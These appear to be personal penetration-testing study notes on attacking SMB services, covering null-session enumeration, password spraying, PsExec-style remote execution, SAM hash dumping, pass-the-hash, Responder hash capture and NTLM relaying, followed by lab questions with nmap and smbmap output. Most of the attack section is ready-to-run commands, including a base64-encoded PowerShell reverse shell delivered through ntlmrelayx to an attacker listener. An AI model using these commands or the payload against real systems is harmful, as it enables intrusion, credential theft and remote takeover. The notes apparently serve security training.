

### Anonymous Authentication

Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`

**File Share - smbclient**
```shell-session
smbclient -N -L //10.129.14.128
```

**Smbmap**

An advantage of `smbmap` is that it provides a list of permissions for each shared folder.
```shell-session
smbmap -H 10.129.14.128
```

Recursively browse the directories with the `-r `or `-R` option:
```shell-session
 smbmap -H 10.129.14.128 -r notes
```

Download a file from the directory. Suppose there's a directory on the share with a `notes.txt` file:
```shell-session
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Now suppose you want to upload a `test.txt` file to said share directory:
```shell-session
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### Remote Procedure Call

**rpcclient**

Use this tool to enumerate Domain Controllers or workstations. This tool can also be used with a null session
```shell-session
rpcclient -U'%' 10.10.110.17
```

Enum4linux is another utility that supports null sessions
```shell-session
./enum4linux-ng.py 10.10.11.45 -A -C
```


## Protocol Specific Attacks

Password spraying is a better alternative since we can target a list of usernames with one common password to avoid account lockouts.

Password spraying can be done with CrackMapExec on SMB

```shell-session
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

#### SMB
If attacking Windows SMB, if the user is an Administrator or has specific privileges, we will be able to perform operations such as:

- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

#### Remote Code Execution

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

- [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
- [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
- [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
- [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

**Impacket PsExec**
To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine

Connect to a remote machine with a local administrator account, using `impacket-psexec`
```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```

**CrackMapExec**

CrackMapExec holds a distinct advantage; the ability to run commands on multiple hosts
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
	-x: run cmd commands
	-X: run PowerShell commands

**Enumerating Logged-on Users**
Use `CrackMapExec` to enumerate logged-on users on all machines within the same network if some of them share the same local admin account.

```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

**Extract Hashes from SAM Database**

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes

```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

**PtH**

Use the NTLM hash to authenticate over SMB. Use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

**Forced Authentication Attacks**

Abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) via `Responder`

Create a fake SMB server with Responder's default configuration
```shell-session
responder -I <interface name>
```

A user attempting to connect to a share folder named /files but misspells it with /fiiles may connect to our fake SMB due to a multicast query to all devices on the network

```shell-session
sudo responder -I ens33
```

Once credentials are captured, the hash can be cracked with hashcat

**hashcat**
```shell-session
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

But if the hash can't be cracked relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). However, a few things need to be configured:

1. Set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`
```shell-session
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

2. Create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
```shell-session
nc -lvnp 9001
```


### Questions

What is the name of the shared folder with READ permissions?

**nmap**
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEtihrnXMQHWhwZCWFPcX8gmBy8EEBjJ9T5lR/9onJz7XvUdcPTsaOovhhVrgFaQu1U5ekn4V+OYuIxJrEfl0dcBhSqQSb81MO3bTK5yZ+rQ958rl5PiYwKGeFc0VR9P3abEdKRn7bcEoXKSRoMof6vwkJMzb5N/7JBFYUo/jfbzovKEkX4t4Bwh6W4dmcPL6Mh4DJjhaHX6qZcC4MZoOV2oLW82T0tfH/KNLsMXBJ/Yqh8GziGy+jcLl31abch2+inXHTdKhoCOHR+A970VjskUs2iWCRsNkYREtTtpCZ738m1gdMQS+BzV2ZhRRcDnGOXMzR7Rk5Azs+luaGNzRlb1q2+NSQlmGzgBEPvIoL4/pBDM3fb8ZiL4gWvq3bqyPGdOi2nZfbpyeYzAqUe6THRvwjAS1wWUMLNt6jgt13xCTVOZV4hKMmLneb/VQXRoDFBF/vFoFDiPxeVNaM7dvBVQIBYbkBLqjYLVV1IFr2otRIbtVrLU+/D/mJvmXM3Xs=
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrNZZh3PTca9YkLp+xpAXtquE6wsTwEZmBtt6mism0idkizZWojfLqjeonge0ZYBEfXjTgMsfJ366hpWedHE8U=
|   256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlAiOeV++/9T5HzXC37wJRor3PaSuVOGLaNFz7pEl1/
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp         ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-12-01T12:59:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ATTCSVC-LINUX<00>    Flags: <unique><active>
|   ATTCSVC-LINUX<03>    Flags: <unique><active>
|   ATTCSVC-LINUX<20>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22376/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64191/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 21254/udp): CLEAN (Failed to receive data)
|   Check 4 (port 22270/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
```

**smbmap**
```
smbmap -H 10.129.203.6                          

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.203.6:445        Name: 10.129.203.6              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        GGJ                                                     READ ONLY       Priv
        IPC$                                                    NO ACCESS       IPC Service (attcsvc-linux Samba)
```

**2. What is the password for the username "jason"?**
```

```